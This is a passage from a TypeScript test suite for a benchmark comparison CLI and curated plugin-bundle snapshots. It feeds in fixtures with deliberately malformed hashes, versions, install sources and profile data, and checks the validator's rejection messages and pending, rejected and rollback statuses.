        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource must contain exactly kind, npmVersion, and npmIntegrity',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...previousLockSnapshot.candidates[0],
              installSource: {
                kind: 'npm',
                npmVersion: '1.2.3',
              },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource.npmIntegrity must be a non-placeholder SHA-512 SRI',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...previousLockSnapshot.candidates[0],
              installSource: {
                kind: 'npm',
                npmVersion: '1.2.3',
                npmIntegrity: `sha512-${Buffer.alloc(64).toString('base64')}`,
              },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource.repository must be a canonical HTTPS GitHub repository URL',
        mutate: (fixture) => {
          const candidate = previousLockSnapshot.candidates[0]
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...candidate,
              installSource: {
                ...candidate.installSource,
                repository: `${candidate.installSource.repository}.git`,
              },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource.repositoryPath must be null or a safe relative POSIX path',
        mutate: (fixture) => {
          const candidate = previousLockSnapshot.candidates[0]
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...candidate,
              installSource: {
                ...candidate.installSource,
                repositoryPath: '../plugin-a',
              },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource must contain exactly kind, repository, commit, repositoryPath, and installScripts',
        mutate: (fixture) => {
          const candidate = previousLockSnapshot.candidates[0]
          const { repositoryPath: _repositoryPath, ...installSource } = candidate.installSource
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{ ...candidate, installSource }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].installSource.installScripts must record no lifecycle scripts',
        mutate: (fixture) => {
          const candidate = previousLockSnapshot.candidates[0]
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{
              ...candidate,
              installSource: {
                ...candidate.installSource,
                installScripts: { prepare: 'npm run build' },
              },
            }],
          })
        },
      },
      {
        message: 'previousSnapshots.lock.snapshot.candidates[0].treeSha256 must be a non-placeholder lowercase SHA-256 digest',
        mutate: (fixture) => {
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            candidates: [{ ...previousLockSnapshot.candidates[0], treeSha256: '0'.repeat(64) }],
          })
        },
      },
      {
        message: 'previousSnapshots.profile.snapshot.bundles[0] must be a non-empty string',
        mutate: (fixture) => {
          fixture.previousSnapshots.profile = snapshotEnvelope({
            ...previousProfileSnapshot,
            bundles: [''],
          })
        },
      },
      {
        message: 'baseline.execution.startedAt must be a canonical ISO timestamp',
        mutate: (fixture) => { fixture.baseline.execution.startedAt = 'yesterday' },
      },
      {
        message: 'baseline.execution.build.sourceDirty must be a boolean',
        mutate: (fixture) => { fixture.baseline.execution.build.sourceDirty = 'false' },
      },
      {
        message: 'baseline.execution.build must contain exactly artifactSha256, dshVersion, nodeVersion, sourceDirty, sourceRevision, and sourceTreeSha256',
        mutate: (fixture) => { fixture.baseline.execution.build.extra = true },
      },
      {
        message: 'baseline.execution.environment must contain exactly model, prompt, workspace, network, and seed',
        mutate: (fixture) => { fixture.baseline.execution.environment.extra = true },
      },
      {
        message: 'baseline.execution.environment.seed must be a non-empty string or safe integer',
        mutate: (fixture) => { fixture.baseline.execution.environment.seed = '' },
      },
      {
        message: 'baseline.runs must not repeat a taskId and attempt',
        mutate: (fixture) => { fixture.baseline.runs[1] = { ...fixture.baseline.runs[0] } },
      },
      {
        message: 'required critical task a must be marked critical in every repetition',
        mutate: (fixture) => { (fixture.baseline.runs[0] as Record<string, unknown>).critical = false },
      },
      {
        message: 'candidate.runs[0].attempt must be a positive safe integer',
        mutate: (fixture) => { (fixture.candidate.runs[0] as Record<string, unknown>).attempt = 0 },
      },
      {
        message: 'requiredCriticalTaskIds must be a non-empty string array',
        mutate: (fixture) => { fixture.requiredCriticalTaskIds = [] },
      },
      {
        message: 'requiredCriticalTaskIds[0] must be a non-empty string',
        mutate: (fixture) => { fixture.requiredCriticalTaskIds = [''] },
      },
      {
        message: 'requiredCriticalTaskIds must not contain duplicates',
        mutate: (fixture) => { fixture.requiredCriticalTaskIds = ['a', 'a'] },
      },
      {
        message: 'baseline.profileSnapshot profile must name a shipped or curated profile template',
        mutate: (fixture) => {
          fixture.baseline.profile = 'unknown-profile'
          fixture.previousSnapshots.lock = snapshotEnvelope({
            ...previousLockSnapshot,
            profile: 'unknown-profile',
          })
          fixture.previousSnapshots.profile = snapshotEnvelope({
            ...previousProfileSnapshot,
            profile: 'unknown-profile',
          })
        },
      },
    ]
    for (const testCase of cases) {
      const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
      testCase.mutate(fixture)
      const path = tempFile('benchmark.json', JSON.stringify(fixture))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout), testCase.message).toMatchObject({
          issues: [{ message: testCase.message }],
        })
      } finally {
        cleanup(path)
      }
    }
  })

  it.each(['lock', 'profile'] as const)(
    'rejects a previous %s snapshot profile that differs from baseline.profile',
    (field) => {
      const path = tempFile(`previous-${field}-profile.json`, benchmarkFixture())
      const fixture = JSON.parse(readFileSync(path, 'utf8')) as MutableBenchmarkFixture
      const snapshot = {
        ...fixture.previousSnapshots[field].snapshot,
        profile: 'other-profile',
      }
      fixture.previousSnapshots[field] = snapshotEnvelope(snapshot)
      writeFileSync(path, JSON.stringify(fixture))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
          issues: [{ message: `previousSnapshots.${field}.snapshot.profile must match baseline.profile` }],
        })
      } finally {
        cleanup(path)
      }
    },
  )

  it('rejects legacy benchmark schema and missing execution identities', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    fixture.schemaVersion = 2
    let path = tempFile('legacy-benchmark.json', JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'benchmark fixture.schemaVersion must be 3' }],
      })
    } finally {
      cleanup(path)
    }

    const missingIdentity = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    Reflect.deleteProperty(missingIdentity.baseline.execution, 'build')
    path = tempFile('missing-build.json', JSON.stringify(missingIdentity))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.execution.build must be an object' }],
      })
    } finally {
      cleanup(path)
    }

    const missingMeasurement = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    Reflect.deleteProperty(missingMeasurement.baseline.execution, 'measurement')
    path = tempFile('missing-measurement.json', JSON.stringify(missingMeasurement))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.execution.measurement must be an object' }],
      })
    } finally {
      cleanup(path)
    }

    for (const [field, value, message] of [
      ['dshVersion', 'latest', 'baseline.execution.build.dshVersion must be an exact SemVer version'],
      ['nodeVersion', 'v22', 'baseline.execution.build.nodeVersion must be an exact SemVer version'],
      ['sourceRevision', '0'.repeat(40), 'baseline.execution.build.sourceRevision must be a full non-placeholder lowercase Git SHA'],
      ['sourceRevision', 'ab'.repeat(20), 'baseline.execution.build.sourceRevision must be a full non-placeholder lowercase Git SHA'],
      ['sourceTreeSha256', '0'.repeat(64), 'baseline.execution.build.sourceTreeSha256 must be a non-placeholder lowercase SHA-256 digest'],
      ['sourceTreeSha256', 'ab'.repeat(32), 'baseline.execution.build.sourceTreeSha256 must be a non-placeholder lowercase SHA-256 digest'],
      ['artifactSha256', '0'.repeat(64), 'baseline.execution.build.artifactSha256 must be a non-placeholder lowercase SHA-256 digest'],
      ['artifactSha256', 'cd'.repeat(32), 'baseline.execution.build.artifactSha256 must be a non-placeholder lowercase SHA-256 digest'],
    ] as const) {
      const invalidBuild = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
      invalidBuild.baseline.execution.build[field] = value
      path = tempFile(`invalid-${field}.json`, JSON.stringify(invalidBuild))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout), field).toMatchObject({
          issues: [{ message }],
        })
      } finally {
        cleanup(path)
      }
    }
  })

  it('rejects mismatched build and measurement identities', () => {
    const buildMismatch = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    buildMismatch.candidate.execution.build = {
      ...buildMismatch.candidate.execution.build,
      artifactSha256: fixtureShaC,
    }
    let path = tempFile('build-mismatch.json', JSON.stringify(buildMismatch))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate DSH build identities must match exactly' }],
      })
    } finally {
      cleanup(path)
    }

    const measurementMismatch = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    measurementMismatch.candidate.execution.measurement = {
      ...measurementMismatch.candidate.execution.measurement,
      tokenizer: 'different-tokenizer@1.0.0',
    }
    path = tempFile('measurement-mismatch.json', JSON.stringify(measurementMismatch))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate measurement identities must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects every stale content-addressed snapshot reference', () => {
    for (const [side, field] of [
      ['baseline', 'lockSnapshot'],
      ['baseline', 'profileSnapshot'],
      ['candidate', 'lockSnapshot'],
      ['candidate', 'profileSnapshot'],
    ] as const) {
      const path = tempFile(`${side}-${field}.json`, benchmarkFixture())
      const fixture = JSON.parse(readFileSync(path, 'utf8')) as MutableBenchmarkFixture
      fixture[side][field].sha256 = fixtureShaC
      writeFileSync(path, JSON.stringify(fixture))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout), `${side}.${field}`)
          .toMatchObject({
            issues: [{ message: `${side}.${field}.sha256 does not match the referenced snapshot` }],
          })
      } finally {
        cleanup(path)
      }
    }
  })

  it.each([
    {
      name: 'profile snapshot kind',
      field: 'profileSnapshot',
      mutate: (snapshot: Record<string, unknown>) => { snapshot.kind = 'curated-lock-snapshot' },
      message: 'candidate.profileSnapshot snapshot.kind must be curated-profile-snapshot',
    },
    {
      name: 'lock snapshot catalog reference',
      field: 'lockSnapshot',
      mutate: (snapshot: Record<string, unknown>) => { snapshot.catalogRef = 'mutable' },
      message: 'candidate.lockSnapshot snapshot must not depend on a mutable catalogRef',
    },
  ] as const)('rejects a bound candidate $name', ({ field, mutate, message }) => {
    const path = tempFile(`candidate-${field}.json`, benchmarkFixture())
    const fixture = JSON.parse(readFileSync(path, 'utf8')) as MutableBenchmarkFixture
    const snapshotPath = join(dirname(path), fixture.candidate[field].path)
    const snapshot = JSON.parse(readFileSync(snapshotPath, 'utf8')) as Record<string, unknown>
    mutate(snapshot)
    writeFileSync(snapshotPath, JSON.stringify(snapshot))
    fixture.candidate[field].sha256 = createHash('sha256').update(canonicalJson(snapshot)).digest('hex')
    writeFileSync(path, JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message }],
      })
    } finally {
      cleanup(path)
    }
  })

  it.each([
    {
      field: 'lockSnapshot',
      mutate: (snapshot: Record<string, unknown>) => { snapshot.candidates = [] },
      message: 'previousSnapshots.lock.snapshot must equal the canonical baseline.lockSnapshot content',
    },
    {
      field: 'profileSnapshot',
      mutate: (snapshot: Record<string, unknown>) => {
        snapshot.bundles = ['@deepseek-ai/dsh-base']
      },
      message: 'previousSnapshots.profile.snapshot must equal the canonical baseline.profileSnapshot content',
    },
  ] as const)('rejects baseline $field content that differs from the previous snapshot', ({
    field,
    mutate,
    message,
  }) => {
    const path = tempFile(`baseline-${field}-content.json`, benchmarkFixture())
    const fixture = JSON.parse(readFileSync(path, 'utf8')) as MutableBenchmarkFixture
    const snapshotPath = join(dirname(path), fixture.baseline[field].path)
    const snapshot = JSON.parse(readFileSync(snapshotPath, 'utf8')) as Record<string, unknown>
    mutate(snapshot)
    writeFileSync(snapshotPath, JSON.stringify(snapshot))
    fixture.baseline[field].sha256 = createHash('sha256').update(canonicalJson(snapshot)).digest('hex')
    writeFileSync(path, JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects authoritative profile-template drift in the comparator', () => {
    const path = tempFile('profile-template-drift.json', benchmarkFixture())
    const fixture = JSON.parse(readFileSync(path, 'utf8')) as MutableBenchmarkFixture
    const profilePath = join(dirname(path), fixture.candidate.profileSnapshot.path)
    const profile = JSON.parse(readFileSync(profilePath, 'utf8')) as { bundles: string[] }
    profile.bundles = [...profile.bundles, '@deepseek-ai/dsh-unapproved']
    writeFileSync(profilePath, JSON.stringify(profile))
    fixture.candidate.profileSnapshot.sha256 = createHash('sha256')
      .update(canonicalJson(profile))
      .digest('hex')
    writeFileSync(path, JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{
          message: 'candidate.profileSnapshot snapshot bundles must match the authoritative web-curated template in order',
        }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('requires symmetric execution provenance for pending benchmarks', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    fixture.evidenceKind = 'planned'
    fixture.pendingCampaigns = ['campaign']
    fixture.baseline.runs = []
    fixture.candidate.runs = []
    Reflect.deleteProperty(fixture.candidate, 'execution')
    const path = tempFile('pending-one-sided-execution.json', JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'benchmark runs require baseline and candidate execution provenance' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('accepts matching execution provenance on pending benchmarks', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    fixture.evidenceKind = 'planned'
    fixture.pendingCampaigns = ['campaign']
    fixture.baseline.runs = []
    fixture.candidate.runs = []
    const path = tempFile('pending-with-execution.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'compare-benchmark',
        evidenceKind: 'planned',
        status: 'pending',
        pendingCampaigns: ['campaign'],
      })
    } finally {
      cleanup(path)
    }
  })

  it('accepts string execution seeds', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { execution: { environment: { seed: number | string } }; runs: Array<Record<string, unknown>> }
      candidate: { execution: { environment: { seed: number | string } }; runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.execution.environment.seed = 'repeatable'
    fixture.candidate.execution.environment.seed = 'repeatable'
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(0)
    } finally {
      cleanup(path)
    }
  })

  it('rejects asymmetric pending evidence and renders unverified and pending text', () => {
    const pending = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    pending.evidenceKind = 'planned'
    pending.pendingCampaigns = ['campaign']
    pending.baseline.runs = []
    const pendingPath = tempFile('pending.json', JSON.stringify(pending))
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    fixture.evidenceKind = 'fixture'
    const fixturePath = tempFile('fixture.json', JSON.stringify(fixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', pendingPath, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.runs must be a non-empty array' }],
      })
      expect(runCompareBenchmark(['--fixture', fixturePath]).stdout)
        .toBe('compare-benchmark: unverified (fixture evidence cannot be accepted)\n')
      expect(runCompareBenchmark([]).stdout).toMatch(/^compare-benchmark: pending \(\d+ campaigns\)\n$/u)
    } finally {
      cleanup(pendingPath)
      cleanup(fixturePath)
    }
  })

  it('rejects observed pending evidence with empty runs', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    fixture.pendingCampaigns = ['campaign']
    fixture.baseline.runs = []
    fixture.candidate.runs = []
    const path = tempFile('observed-pending-empty.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline.runs must be a non-empty array' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('evaluates observed pending runs against rejection and rollback gates', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    fixture.pendingCampaigns = ['campaign']
    for (const run of fixture.candidate.runs) {
      run.securityCorrectness = 90
      run.firstTokenMs = 1_000
    }
    const path = tempFile('observed-pending-runs.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as BenchmarkComparison

      expect(result.status).toBe(1)
      expect(payload.status).toBe('rejected')
      expect(payload.nonCompensableFailures).toContainEqual(expect.objectContaining({
        code: 'security-correctness-below-95',
      }))
      expect(payload.rollback).toMatchObject({
        required: true,
        reasons: [expect.objectContaining({ code: 'first-token-p95-regression' })],
      })
    } finally {
      cleanup(path)
    }
  })

  it('does not report planned evidence with runs as pending', () => {
    const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
    fixture.evidenceKind = 'planned'
    fixture.pendingCampaigns = ['campaign']
    const path = tempFile('planned-with-runs.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])
      const payload = JSON.parse(result.stdout) as Record<string, unknown>

      expect(result.status).toBe(1)
      expect(payload).toMatchObject({
        evidenceKind: 'planned',
        status: 'unverified',
        baseline: { profile: 'web' },
        candidate: { profile: 'web-curated' },
      })
      expect(payload).not.toHaveProperty('pendingCampaigns')
    } finally {
      cleanup(path)
    }
  })

  it('requires critical declarations and coverage for planned records with runs', () => {
    for (const [name, mutate, message] of [
      [
        'missing-required-critical',
        (fixture: MutableBenchmarkFixture) => { Reflect.deleteProperty(fixture, 'requiredCriticalTaskIds') },
        'requiredCriticalTaskIds must be a non-empty string array',
      ],
      [
        'no-critical-runs',
        (fixture: MutableBenchmarkFixture) => {
          fixture.requiredCriticalTaskIds = ['task']
          for (const run of [...fixture.baseline.runs, ...fixture.candidate.runs]) run.critical = false
        },
        'required critical task task is missing from the comparison',
      ],
    ] as const) {
      const fixture = JSON.parse(benchmarkFixture()) as MutableBenchmarkFixture
      fixture.evidenceKind = 'planned'
      fixture.pendingCampaigns = ['campaign']
      mutate(fixture)
      const path = tempFile(`${name}.json`, JSON.stringify(fixture))
      try {
        expect(JSON.parse(runCompareBenchmark(['--fixture', path, '--json']).stdout), name).toMatchObject({
          issues: [{ message }],
        })
      } finally {
        cleanup(path)
      }
    }
  })

  it('rejects invalid root arguments', () => {
    expect(JSON.parse(runVerifyLock(['--artifact-root=', '--json']).stdout)).toMatchObject({
      issues: [{ message: '--artifact-root requires a value' }],
    })
    expect(JSON.parse(runVerifyLock(['--artifact-root=relative', '--json']).stdout)).toMatchObject({
      issues: [{ message: '--artifact-root must be an absolute path' }],
    })
  })

  it('reports benchmark run field type errors after top-level fields parse', () => {
    const invalidProfileFixture = JSON.parse(benchmarkFixture()) as { baseline: Record<string, unknown> }
    invalidProfileFixture.baseline.profile = ''
    const invalidProfile = tempFile('invalid-profile.json', JSON.stringify(invalidProfileFixture))
    const invalidFailureFixture = JSON.parse(benchmarkFixture()) as { baseline: { runs: Array<Record<string, unknown>> } }
    invalidFailureFixture.baseline.runs[0] = { ...invalidFailureFixture.baseline.runs[0], failure: 1 }
    const invalidFailure = tempFile('invalid-failure.json', JSON.stringify(invalidFailureFixture))
    const invalidBooleanFixture = JSON.parse(benchmarkFixture()) as { candidate: { runs: Array<Record<string, unknown>> } }
    invalidBooleanFixture.candidate.runs[0] = { ...invalidBooleanFixture.candidate.runs[0], success: 'yes' }
    const invalidBoolean = tempFile('invalid-boolean.json', JSON.stringify(invalidBooleanFixture))
    const invalidNumberFixture = JSON.parse(benchmarkFixture()) as { candidate: { runs: Array<Record<string, unknown>> } }
    invalidNumberFixture.candidate.runs[0] = { ...invalidNumberFixture.candidate.runs[0], firstTokenMs: Number.POSITIVE_INFINITY }
    const invalidNumber = tempFile('invalid-number.json', JSON.stringify(invalidNumberFixture))
    try {
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidProfile, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.profile must be a non-empty string' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidFailure, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'baseline.runs[0].failure must be null or a non-empty string' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidBoolean, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'candidate.runs[0].success must be a boolean' }],
      })
      expect(JSON.parse(runCompareBenchmark(['--fixture', invalidNumber, '--json']).stdout)).toMatchObject({
        issues: [{ message: 'candidate.runs[0].firstTokenMs must be a non-negative finite number' }],
      })
    } finally {
      cleanup(invalidProfile)
      cleanup(invalidFailure)
      cleanup(invalidBoolean)
      cleanup(invalidNumber)
    }
  })

  it.each([
    {
      success: false,
      failure: null,
      message: 'baseline.runs[0].failure must be non-empty when success is false',
    },
    {
      success: true,
      failure: 'unexpected-reason',
      message: 'baseline.runs[0].failure must be null when success is true',
    },
  ])('rejects inconsistent benchmark success/failure evidence: $message', ({ success, failure, message }) => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.runs[0] = { ...fixture.baseline.runs[0], success, failure }
    const path = tempFile('inconsistent-outcome.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects impossible benchmark numeric evidence before computing summaries', () => {
    const fixtures = [
      [
        tempFile('invalid-score.json', benchmarkFixture([benchmarkRun({ taskId: 'invalid-score', quality: 101 })])),
        'candidate.runs[15].quality must be between 0 and 100',
      ],
      [
        tempFile('negative-data-loss.json', benchmarkFixture([benchmarkRun({ taskId: 'negative-data-loss', dataLossEvents: -1 })])),
        'candidate.runs[15].dataLossEvents must be a non-negative safe integer',
      ],
      [
        tempFile('fractional-tokens.json', benchmarkFixture([benchmarkRun({ taskId: 'fractional-tokens', promptTokens: 1.5 })])),
        'candidate.runs[15].promptTokens must be a non-negative safe integer',
      ],
      [
        tempFile('negative-latency.json', benchmarkFixture([benchmarkRun({ taskId: 'negative-latency', firstTokenMs: -1 })])),
        'candidate.runs[15].firstTokenMs must be a non-negative finite number',
      ],
      [
        tempFile('negative-cost.json', benchmarkFixture([benchmarkRun({ taskId: 'negative-cost', costUsd: -0.01 })])),
        'candidate.runs[15].costUsd must be a non-negative finite number',
      ],
    ] as const
    try {
      for (const [path, message] of fixtures) {
        const result = runCompareBenchmark(['--fixture', path, '--json'])
        expect(result.status).toBe(1)
        expect(JSON.parse(result.stdout)).toMatchObject({
          command: 'compare-benchmark',
          ok: false,
          issues: [{ message }],
        })
      }
    } finally {
      for (const [path] of fixtures) cleanup(path)
    }
  })

  it('keeps pending long-cycle campaigns out of accepted status without fabricated runs', () => {
    const result = runCompareBenchmark(['--json'])

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toEqual({
      command: 'compare-benchmark',
      evidenceKind: 'planned',
      ok: false,
      status: 'pending',
      pendingCampaigns: [
        'web-search',
        'memory',
        'browser-computer-use',
        'mcp-management',
        'canary',
      ],
      baseline: { profile: 'web' },
      candidate: { profile: 'web-curated' },
    })
  })
})

describe('curated-bench assets', () => {
  it('publishes benchmark asset directories and accepts their sentinels', () => {
    expect(curatedBenchBaselinesDir).toContain('/packages/curated/curated-bench/baselines/')
    expect(curatedBenchManifestsDir).toContain('/packages/curated/curated-bench/manifests/')
    expect(curatedBenchTasksDir).toContain('/packages/curated/curated-bench/tasks/')
    expect(curatedBenchInvariant.validateCuratedBenchAssets({
      baselines: curatedBenchBaselinesDir,
      manifests: curatedBenchManifestsDir,
      tasks: curatedBenchTasksDir,
    })).toEqual([])
  })

  it('keeps curated benchmark snapshots aligned with policy and profiles', () => {
    const catalog = loadCuratedCatalog()
    const admissionTiers: Record<AdmissionTier, number> = {
      default: 0,
      scenario: 0,
      experimental: 0,
      rejected: 0,
    }
    for (const candidate of catalog.candidates) {
      const hardRejections = candidate.rejections.map(rejection => rejection.code)
      admissionTiers[classifyAdmission(candidate.score, hardRejections)] += 1
    }
    const deliveryStatuses: Record<CuratedCandidateStatus, number> = {
      active: 0,
      qualified: 0,
      pending: 0,
      rejected: 0,
    }
    for (const candidate of catalog.candidates) deliveryStatuses[deriveCandidateStatus(candidate)] += 1
    const expectedSummary = {
      candidateCount: catalog.candidates.length,
      activeCount: catalog.candidates.filter(candidate => candidate.active).length,
      rejectedCount: admissionTiers.rejected,
      admissionTiers,
      deliveryStatuses,
    }
    const candidatesManifest = JSON.parse(
      readFileSync(join(curatedBenchManifestsDir, 'curated-candidates.json'), 'utf8'),
    ) as {
      generatedAt: string
      summary: {
        candidateCount: number
        activeCount: number
        rejectedCount: number
        admissionTiers: Record<AdmissionTier, number>
        deliveryStatuses: Record<CuratedCandidateStatus, number>
        sourceContentSha256ByCandidate: Record<string, string>
        treeSha256ByCandidate: Record<string, string>
        runtimeDependencyClosureSha256ByCandidate: Record<string, string>
      }
    }
    const webCuratedLock = JSON.parse(
      readFileSync(join(curatedBenchBaselinesDir, 'locks/web-curated.json'), 'utf8'),
    ) as {
      candidates: Array<{
        id: string
        expectedPackage: string
        bundlePatch: string
        sourceContentSha256: string
        treeSha256: string
        runtimeDependencyClosureSha256: string
        installSource:
          | { kind: 'npm'; npmVersion: string; npmIntegrity: string }
          | {
            kind: 'git'
            repository: string
            commit: string
            repositoryPath: string | null
            installScripts: Record<string, string>
          }
      }>
      profile: string
    }
    const webCuratedProfile = JSON.parse(
      readFileSync(join(curatedBenchBaselinesDir, 'profiles/web-curated.json'), 'utf8'),
    ) as { bundles: string[]; profile: string }
    const activeWebCuratedCandidates = catalog.candidates.filter(candidate =>
      candidate.active && candidate.targetProfiles.includes('web-curated'))
    const actualSummary = {
      candidateCount: candidatesManifest.summary.candidateCount,
      activeCount: candidatesManifest.summary.activeCount,
      rejectedCount: candidatesManifest.summary.rejectedCount,
      admissionTiers: candidatesManifest.summary.admissionTiers,
      deliveryStatuses: candidatesManifest.summary.deliveryStatuses,
    }
    const auditDates = [...new Set(catalog.candidates.map(candidate => candidate.auditedAt))]

    expect(actualSummary).toEqual(expectedSummary)
    expect(candidatesManifest.summary.runtimeDependencyClosureSha256ByCandidate)
      .toEqual(Object.fromEntries(catalog.candidates
        .filter(candidate => candidate.active)
        .map(candidate => [candidate.id, candidate.runtimeDependencyClosureSha256])))
    expect(candidatesManifest.summary.sourceContentSha256ByCandidate)
      .toEqual(Object.fromEntries(catalog.candidates
        .filter(candidate => candidate.sourceStatus === 'verified')
        .map(candidate => [candidate.id, candidate.sourceContentSha256])))
    expect(candidatesManifest.summary.treeSha256ByCandidate)
      .toEqual(Object.fromEntries(catalog.candidates
        .filter(candidate => candidate.active)
        .map(candidate => [candidate.id, candidate.treeSha256])))
    expect({
      auditDates,
      manifestGeneratedAt: candidatesManifest.generatedAt,
    }).toEqual({
      auditDates: ['2026-08-27'],
      manifestGeneratedAt: '2026-08-27',
    })
    expect(webCuratedLock).toMatchObject({
      profile: 'web-curated',
      candidates: activeWebCuratedCandidates.map(candidate => ({
        id: candidate.id,
        expectedPackage: candidate.expectedPackage,
        bundlePatch: candidate.bundlePatch,
        sourceContentSha256: candidate.sourceContentSha256,
        treeSha256: candidate.treeSha256,
        runtimeDependencyClosureSha256: candidate.runtimeDependencyClosureSha256,
        installSource: candidate.npmVersion === undefined
          ? {
            kind: 'git',
            repository: candidate.repository,
            commit: candidate.commit,
            repositoryPath: candidate.repositoryPath,
            installScripts: candidate.installScripts,
          }
          : {
            kind: 'npm',
            npmVersion: candidate.npmVersion,
            npmIntegrity: candidate.npmIntegrity,
          },
      })),
    })
    expect(webCuratedProfile.profile).toBe('web-curated')
    expect(webCuratedProfile.bundles).toEqual(CURATED_PROFILE_TEMPLATES['web-curated'].bundles)
    expect(webCuratedProfile.bundles).not.toContain('dsh-context')
    expect(webCuratedProfile.bundles).not.toContain('dsh-config-manager')
  })

  it('reports each missing benchmark asset sentinel', () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-bench-assets-'))
    const baselines = join(root, 'baselines')
    const manifests = join(root, 'manifests')
    const tasks = join(root, 'tasks')
    mkdirSync(baselines)
    mkdirSync(manifests)
    mkdirSync(tasks)
    try {
      expect(curatedBenchInvariant.validateCuratedBenchAssets({ baselines, manifests, tasks })).toEqual([
        'curated benchmark manifests directory is missing its sentinel',
        'curated benchmark tasks directory is missing its sentinel',
        'curated benchmark baselines directory is missing its sentinel',
      ])
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

